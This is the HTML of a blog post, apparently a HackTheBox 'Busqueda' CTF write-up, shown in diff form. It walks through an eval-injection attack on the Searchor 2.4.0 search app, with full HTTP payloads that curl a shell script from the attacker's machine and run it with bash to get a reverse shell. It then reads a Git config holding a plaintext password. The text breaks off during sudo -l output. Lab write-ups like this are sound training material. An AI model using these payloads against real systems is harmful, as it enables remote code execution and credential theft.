@@ -1,0 +1,617 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>HackTheBox - Busqueda &middot; Congo</title>
+    <meta name="title" content="HackTheBox - Busqueda &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/htb.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/busqueda-htb/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/busqueda-htb/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="HackTheBox - Busqueda">
+  <meta property="og:description" content="{% img /img/htb.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-08-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-08-12T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HackTheBox - Busqueda">
+<meta name="twitter:description" content="{% img /img/htb.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "HackTheBox - Busqueda",
+    "headline": "HackTheBox - Busqueda",
+    
+    "abstract": "{% img \/img\/htb.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/busqueda-htb\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-08-12T00:00:00\u002b00:00",
+    "datePublished": "2023-08-12T00:00:00\u002b00:00",
+    
+    "dateModified": "2023-08-12T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "872"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Busqueda
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-08-12 00:00:00 &#43;0000 UTC">12 August 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/htb.png %}</p>
+<p>Writeup for HackTheBox Busqueda Machine</p>
+<!-- more -->
+<p>Starting off with the <code>nmap</code> scan, we see that it has HTTP and SSH, as expected.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>     <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>         <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">4</span><span class="n">fe3a667a227f9118dc30ed773a02c28</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mf">816e78766</span><span class="n">b8aea7d1babd436b7f8ecc4</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>        <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.52</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="err">?</span>
+</span></span></code></pre></div><p>Now, moving on with the <code>searcher.htb</code> , it seems to provide a search service where you can use different search engines</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>From further enumeration, we identified that the application is built on top of <a href="https://github.com/ArjunSharda/Searchor" target="_blank" rel="noreferrer">https://github.com/ArjunSharda/Searchor</a> which we got from the footer of the page.  The version number mentioned on the page was 2.4.0 and the latest was 2.5.2. To check for the specific version, from the commit changes I noticed there was an <code>eval</code> function which was called with the given values for the <code>query</code> and <code>engine</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_1.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Above code is something of interest, what we can do here is exploit that <code>eval</code> to use python functions like <code>compile</code> (this is used to evaluate the python code as expressions and execute the code) , this can be done by doing something like <code>' &lt;python code&gt;</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">query</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39;+eval(compile(&#39;</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>\<span class="n">n</span> <span class="kn">import</span> <span class="nn">os</span>\<span class="n">n</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;curl 10.10.14.22/shell.sh -o /tmp/shell.sh&#34;</span><span class="p">)</span><span class="s1">&#39;,&#39;</span><span class="n">a</span><span class="s1">&#39;,&#39;</span><span class="n">single</span><span class="s1">&#39;))+&#39;</span>
+</span></span></code></pre></div><p>Now, this will execute the payload such that it will call <code>eval</code> again which will evaluate the code <code>compile</code> executing the code, here we downloading a bash script which will later gets executed with <code>os.system</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">search</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">searcher</span><span class="p">.</span><span class="nx">htb</span>
+</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">157</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Origin</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//searcher.htb
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//searcher.htb/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">engine</span><span class="o">=</span><span class="nx">Accuweather</span><span class="o">&amp;</span><span class="nx">query</span><span class="o">=</span><span class="nx">test</span><span class="s1">&#39;%2beval(compile(&#39;</span><span class="k">for</span><span class="o">+</span><span class="nx">x</span><span class="o">+</span><span class="k">in</span><span class="o">+</span><span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">a</span><span class="err">\</span><span class="nx">n</span><span class="o">+</span><span class="kr">import</span><span class="o">+</span><span class="nx">os</span><span class="err">\</span><span class="nx">n</span><span class="o">+</span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;curl+10.10.14.22/shell.sh+-o+/tmp/shell.sh&#34;</span><span class="p">)</span><span class="s1">&#39;,&#39;</span><span class="nx">a</span><span class="s1">&#39;,&#39;</span><span class="nx">single</span><span class="s1">&#39;))%2b&#39;</span>
+</span></span></code></pre></div><p>Now, following will just execute the previously downloaded bash script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">search</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">searcher</span><span class="p">.</span><span class="nx">htb</span>
+</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">133</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Origin</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//searcher.htb
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">:</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//searcher.htb/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">engine</span><span class="o">=</span><span class="nx">Accuweather</span><span class="o">&amp;</span><span class="nx">query</span><span class="o">=</span><span class="nx">test</span><span class="s1">&#39;%2beval(compile(&#39;</span><span class="k">for</span><span class="o">+</span><span class="nx">x</span><span class="o">+</span><span class="k">in</span><span class="o">+</span><span class="nx">range</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">a</span><span class="err">\</span><span class="nx">n</span><span class="o">+</span><span class="kr">import</span><span class="o">+</span><span class="nx">os</span><span class="err">\</span><span class="nx">n</span><span class="o">+</span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash+/tmp/shell.sh&#34;</span><span class="p">)</span><span class="s1">&#39;,&#39;</span><span class="nx">a</span><span class="s1">&#39;,&#39;</span><span class="nx">single</span><span class="s1">&#39;))%2b&#39;</span>
+</span></span></code></pre></div><p>Doing so, we got the reverse shell as <code>svc</code> user:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>In the same directory, there was a <code>.git</code> folder which had the <code>config</code> file which had the password for the <code>cody</code> user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">cat</span> <span class="p">.</span><span class="nx">git</span><span class="o">/</span><span class="nx">config</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cat</span> <span class="nx">config</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">core</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">repositoryformatversion</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">filemode</span> <span class="o">=</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">bare</span> <span class="o">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">logallrefupdates</span> <span class="o">=</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">remote</span> <span class="s2">&#34;origin&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">url</span> <span class="o">=</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fetch</span> <span class="o">=</span> <span class="o">+</span><span class="nx">refs</span><span class="o">/</span><span class="nx">heads</span><span class="o">/*:</span><span class="nx">refs</span><span class="o">/</span><span class="nx">remotes</span><span class="o">/</span><span class="nx">origin</span><span class="o">/*</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">branch</span> <span class="s2">&#34;main&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">remote</span> <span class="o">=</span> <span class="nx">origin</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">merge</span> <span class="o">=</span> <span class="nx">refs</span><span class="o">/</span><span class="nx">heads</span><span class="o">/</span><span class="nx">main</span>
+</span></span></code></pre></div><p>The <code>svc</code> user had <code>user.txt</code> which we can get:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">cd</span> <span class="o">~</span><span class="err">/</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cd</span> <span class="o">~</span><span class="err">/</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="nx">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="err">/home/svc</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>
+</span></span><span class="line"><span class="cl"><span class="nx">total</span> <span class="mi">44</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwxr</span><span class="o">-</span><span class="nx">x</span><span class="o">---</span> <span class="mi">6</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">22</span> <span class="mi">16</span><span class="o">:</span><span class="mi">42</span> <span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">3</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">22</span> <span class="mi">18</span><span class="o">:</span><span class="mi">56</span> <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="nx">lrwxrwxrwx</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span>    <span class="mi">9</span> <span class="nx">Feb</span> <span class="mi">20</span> <span class="mi">12</span><span class="o">:</span><span class="mi">08</span> <span class="p">.</span><span class="nx">bash_history</span> <span class="o">-&gt;</span> <span class="err">/dev/null</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">svc</span>  <span class="nx">svc</span>   <span class="mi">220</span> <span class="nx">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="p">.</span><span class="nx">bash_logout</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">3771</span> <span class="nx">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="p">.</span><span class="nx">bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">4096</span> <span class="nx">Feb</span> <span class="mi">28</span> <span class="mi">11</span><span class="o">:</span><span class="mi">37</span> <span class="p">.</span><span class="nx">cache</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">svc</span>  <span class="nx">svc</span>    <span class="mi">76</span> <span class="nx">Apr</span>  <span class="mi">3</span> <span class="mi">08</span><span class="o">:</span><span class="mi">58</span> <span class="p">.</span><span class="nx">gitconfig</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">22</span> <span class="mi">16</span><span class="o">:</span><span class="mi">42</span> <span class="p">.</span><span class="nx">gnupg</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwxrwxr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">5</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">4096</span> <span class="nx">Jun</span> <span class="mi">15</span>  <span class="mi">2022</span> <span class="p">.</span><span class="nx">local</span>
+</span></span><span class="line"><span class="cl"><span class="nx">lrwxrwxrwx</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span>    <span class="mi">9</span> <span class="nx">Apr</span>  <span class="mi">3</span> <span class="mi">08</span><span class="o">:</span><span class="mi">58</span> <span class="p">.</span><span class="nx">mysql_history</span> <span class="o">-&gt;</span> <span class="err">/dev/null</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">svc</span>  <span class="nx">svc</span>   <span class="mi">807</span> <span class="nx">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="p">.</span><span class="nx">profile</span>
+</span></span><span class="line"><span class="cl"><span class="nx">lrwxrwxrwx</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span>    <span class="mi">9</span> <span class="nx">Feb</span> <span class="mi">20</span> <span class="mi">14</span><span class="o">:</span><span class="mi">08</span> <span class="p">.</span><span class="nx">searchor</span><span class="o">-</span><span class="nx">history</span><span class="p">.</span><span class="nx">json</span> <span class="o">-&gt;</span> <span class="err">/dev/null</span>
+</span></span><span class="line"><span class="cl"><span class="nx">drwx</span><span class="o">------</span> <span class="mi">3</span> <span class="nx">svc</span>  <span class="nx">svc</span>  <span class="mi">4096</span> <span class="nx">Apr</span> <span class="mi">22</span> <span class="mi">16</span><span class="o">:</span><span class="mi">41</span> <span class="nx">snap</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">svc</span>    <span class="mi">33</span> <span class="nx">Apr</span> <span class="mi">22</span> <span class="mi">12</span><span class="o">:</span><span class="mi">28</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">cat</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">cat</span> <span class="nx">user</span><span class="p">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ef72983276d36e5283938e4b72f9898d</span>
+</span></span></code></pre></div><p>Now, using the <code>cody</code> user’s password for performing <code>sudo -l</code> on the machine, we see that</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+</span></span><span class="line"><span class="cl"><span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Matching</span> <span class="nx">Defaults</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">svc</span> <span class="nx">on</span> <span class="nx">busqueda</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">env_reset</span><span class="p">,</span> <span class="nx">mail_badpass</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secure_path</span><span class="o">=</span><span class="err">/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">use_pty</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">User</span> <span class="nx">svc</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="nx">busqueda</span><span class="o">:</span>
